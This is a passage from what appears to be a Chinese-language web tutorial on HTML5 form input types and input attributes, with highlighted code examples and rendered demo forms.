punctuation">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bday<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2020-01-02<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Enter a date before 1990-01-01:  <input type="date" name="bday" max="1989-12-31"><br>  Enter a date after 2020-01-01:  <input type="date" name="bday" min="2020-01-02"><br></form><br><h4 id="月份输入-month"><a href="#月份输入-month" class="headerlink" title="月份输入 month"></a>月份输入 month</h4><p><code>&lt;input type="month"&gt;</code> 允许用户选择月份和年份。</p><p>这个在 Firefox 上不支持，Chrome 上是可以的。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Birthday (month and year):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>month<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaymonth<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Birthday (month and year):  <input type="month" name="bdaymonth"></form><br><h4 id="周输入-week"><a href="#周输入-week" class="headerlink" title="周输入 week"></a>周输入 week</h4><p><code>&lt;input type="week"&gt;</code> 允许用户选择周和年。</p><p>在 Firefox 上好像也不支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select a week:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>week<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>week_year<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select a week:  <input type="week" name="week_year"></form><br><h4 id="无时区时间输入-time"><a href="#无时区时间输入-time" class="headerlink" title="无时区时间输入 time"></a>无时区时间输入 time</h4><p><code>&lt;input type="time"&gt;</code> 选择时间（无时区）。</p><p>Firefox 也不支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select a time:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>time<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usr_time<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select a time:  <input type="time" name="usr_time"></form><br><h4 id="有时区时间输入-datetime"><a href="#有时区时间输入-datetime" class="headerlink" title="有时区时间输入 datetime"></a>有时区时间输入 datetime</h4><p><code>&lt;input type="datetime"&gt;</code> 选择时间（无时区）。</p><p>Chrome、Firefox 或 Internet Explorer 都不支持 type=”datetime”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Birthday (date and time):  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>datetime<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Birthday (date and time):  <input type="datetime" name="bdaytime"></form><br><h4 id="无时区时间输入-datetime-local"><a href="#无时区时间输入-datetime-local" class="headerlink" title="无时区时间输入 datetime-local"></a>无时区时间输入 datetime-local</h4><p><code>&lt;input type="datetime-local"&gt;</code> 选择日期和时间（无时区）。</p><p>Firefox 或者 Internet Explorer 不支持。Chrome 支持。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  输入一个具体时间（日期和时间）：  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>datetime-local<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bdaytime<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Send<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="#">  输入一个具体时间（日期和时间）：  <input type="datetime-local" name="bdaytime"></form><br><h4 id="颜色输入-color"><a href="#颜色输入-color" class="headerlink" title="颜色输入 color"></a>颜色输入 color</h4><p><code>&lt;input type="color"&gt;</code> 用于应该包含颜色的输入字段。</p><p>点击会弹出颜色选择器。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/color_picker.png" alt="颜色选择器"></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Select your favorite color:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>color<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>favcolor<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Select your favorite color:  <input type="color" name="favcolor"></form><br><p>提交的值类似于 <code>favcolor=#ff1234</code>（urlencode后为 <code>favcolor=%23ff1234</code>）</p><p>十六进制形式的颜色RGB形式。</p><h4 id="范围输入-range"><a href="#范围输入-range" class="headerlink" title="范围输入 range"></a>范围输入 range</h4><p><code>&lt;input type="range"&gt;</code> 用于应该包含一定范围内的值的输入字段。</p><p>样式是一个滑块。</p><p>可以使用如下属性来规定限制：min、max、step、value。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>range<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>points<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  <input type="range" name="points" min="0" max="10"></form><br><h4 id="电子邮件地址输入-email"><a href="#电子邮件地址输入-email" class="headerlink" title="电子邮件地址输入 email"></a>电子邮件地址输入 email</h4><p><code>&lt;input type="email"&gt;</code> 用于应该包含电子邮件地址的输入字段。</p><p>根据浏览器支持，能够在被提交时自动对电子邮件地址进行验证，也可以自己写一个pattern来做简单的有效性验证。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  E-mail:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  E-mail:  <input type="email" name="email"></form><br><h4 id="搜索字段输入-search"><a href="#搜索字段输入-search" class="headerlink" title="搜索字段输入 search"></a>搜索字段输入 search</h4><p><code>&lt;input type="search"&gt;</code> 用于搜索字段（搜索字段的表现类似常规文本字段）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Search Miao:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>miaosearch<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Search Miao:  <input type="search" name="googlesearch"></form><br><h4 id="电话号码的输入-tel"><a href="#电话号码的输入-tel" class="headerlink" title="电话号码的输入 tel"></a>电话号码的输入 tel</h4><p><code>&lt;input type="tel"&gt;</code> 用于应该包含电话号码的输入字段。</p><p>浏览器支持不是很好。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Telephone:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>tel<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>usrtel<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Telephone:  <input type="tel" name="usrtel"></form><br><h4 id="URL-地址输入-url"><a href="#URL-地址输入-url" class="headerlink" title="URL 地址输入 url"></a>URL 地址输入 url</h4><p><code>&lt;input type="url"&gt;</code> 用于应该包含 URL 地址的输入字段。</p><p>根据浏览器支持，在提交时能够自动验证 <code>url</code> 字段。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>  Add your website:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>website<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form>  Add your website:  <input type="url" name="website"></form><br><h4 id="文件输入-上传-file"><a href="#文件输入-上传-file" class="headerlink" title="文件输入/上传 file"></a>文件输入/上传 file</h4><p><code>&lt;input type="file"&gt;</code> 用于指定上传的文件。</p><input type="file"><br><h3 id="input-元素的属性"><a href="#input-元素的属性" class="headerlink" title="input 元素的属性"></a>input 元素的属性</h3><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>指定输入字段的默认值。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Last name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lastname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><form action="">First name:<br><input type="text" name="firstname" value="Miao"><br>Last name:<br><input type="text" name="lastname"></form><br><h4 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a>readonly</h4><p>只读，不可修改。但它<strong>也会作为参数提交给服务器。</strong></p><p>readonly 属性不需要值。它等同于 readonly=”readonly”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">readonly</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" readonly=""></form> <br><h4 id="disabled"><a href="#disabled" class="headerlink" title="disabled"></a>disabled</h4><p><em>disabled</em> 属性规定输入字段是禁用的。</p><p>被禁用的元素是不可用和不可点击的。被禁用的元素<strong>不会被提交</strong>。</p><p>disabled 属性也不需要值。它等同于 disabled=”disabled”。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" disabled=""></form> <br><h4 id="size"><a href="#size" class="headerlink" title="size"></a>size</h4><p><em>size</em> 属性规定输入字段的尺寸（以字符计）。</p><p>指的是输入框的长度。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" size="40"></form> <br><h4 id="maxlength"><a href="#maxlength" class="headerlink" title="maxlength"></a>maxlength</h4><p><em>maxlength</em> 属性规定输入字段允许的最大长度。</p><p>一个汉字算作两个字符。</p><p>如设置 maxlength 属性，则输入控件不会接受超过所允许数的字符。</p><p>该属性不会提供任何反馈。如果需要提醒用户，则必须编写 JavaScript 代码。</p><p>注意，无论前端如何做提示，只要知道了提交的地址，照样可以构造一个请求进行提交。因此<strong>后端也要做好相应的输入限制判断</strong>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>firstname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>John<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action=""><input type="text" name="firstname" value="John" maxlength="10"></form> <br><hr><p>以下为H5中的新属性。</p><h4 id="autocomplete"><a href="#autocomplete" class="headerlink" title="autocomplete"></a>autocomplete</h4><p>autocomplete 属性规定表单或输入字段是否应该自动完成。</p><p>当自动完成开启，浏览器会基于用户之前的输入值自动填写值。<strong>默认是开启的。</strong></p><p>可以把表单 form 中的 autocomplete 设置为 on，同时把特定的输入字段设置为 off，反之亦然。这样特定的输入就会优先它自己的设置。</p><p>autocomplete 属性适用于 <code>&lt;form&gt;</code> 以及如下 <code>&lt;input&gt;</code> 类型：text、search、url、tel、email、password、datepickers、range 以及 color。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   First name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   Last name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">autocomplete</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>off<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span> </code></pre><form action="#" autocomplete="on">   First name:<input type="text" name="fname"><br>   Last name: <input type="text" name="lname"><br>   E-mail: <input type="email" name="email" autocomplete="off"><br></form> <br><h4 id="autofocus"><a href="#autofocus" class="headerlink" title="autofocus"></a>autofocus</h4><p>autofocus 属性是布尔属性。</p><p>如果设置，则规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。</p><p>就是光标自动出现在打了autofocus标签的位置，敲键盘就直接输入到相应的文本框里了。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  First name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fname<span class="token punctuation">"</span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  Last name:  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/input_autofocus.png" alt="autofocus"></p><h4 id="height-amp-width"><a href="#height-amp-width" class="headerlink" title="height &amp; width"></a>height &amp; width</h4><p>规定 <code>&lt;input&gt;</code> 元素的高度和宽度。</p><p>height 和 width 属性仅用于 <code>&lt;input type="image"&gt;</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>image<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img_submit.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>48<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>image 输入类型默认会发生点击图像按钮时的 X 和 Y 坐标。</p><h4 id="min-amp-max"><a href="#min-amp-max" class="headerlink" title="min &amp; max"></a>min &amp; max</h4><p>规定 <code>&lt;input&gt;</code> 元素的最小值和最大值。</p><p>适用的类型：number、range、date、datetime、datetime-local、month、time 以及 week。</p><h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>规定 <code>&lt;input&gt;</code> 元素的合法数字间隔。</p><p>示例：如果 step=”3”，则合法数字应该是 -3、0、3、6、等等。</p><p>可与 max 以及 min 属性一同使用，来创建合法值的范围。</p><p>适用于以下输入类型：number、range、date、datetime、datetime-local、month、time 以及 week。</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>list 属性引用的 <code>&lt;datalist&gt;</code> 元素中包含了 <code>&lt;input&gt;</code> 元素的预定义选项。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">list</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>datalist</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>browsers<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Internet Explorer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Firefox<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Chrome<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Opera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Safari<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>datalist</span><span class="token punctuation">></span></span> </code></pre><input list="browsers"><datalist id="browsers">   <option value="Internet Explorer">   </option><option value="Firefox">   </option><option value="Chrome">   </option><option value="Opera">   </option><option value="Safari"></option></datalist> <br><h4 id="multiple"><a href="#multiple" class="headerlink" title="multiple"></a>multiple</h4><p>布尔属性。如果设置，则允许在 <code>&lt;input&gt;</code> 元素中输入一个以上的值。</p><p>适用的类型：email 和 file。</p><pre class=" language-html"><code class="language-html">Select images: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>img<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token punctuation">></span></span></code></pre><p>Select images: <input type="file" name="img" multiple=""></p><p>上面这个就是允许上传多张图片。</p><h4 id="form"><a href="#form" class="headerlink" title="form"></a>form</h4><p>form 属性规定 <code>&lt;input&gt;</code> 元素所属的一个或多个表单。</p><p>如需引用一个以上的表单，请使用空格分隔的表单 id 列表。</p><p>输入字段位于 HTML 表单之外（但仍属表单）。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span 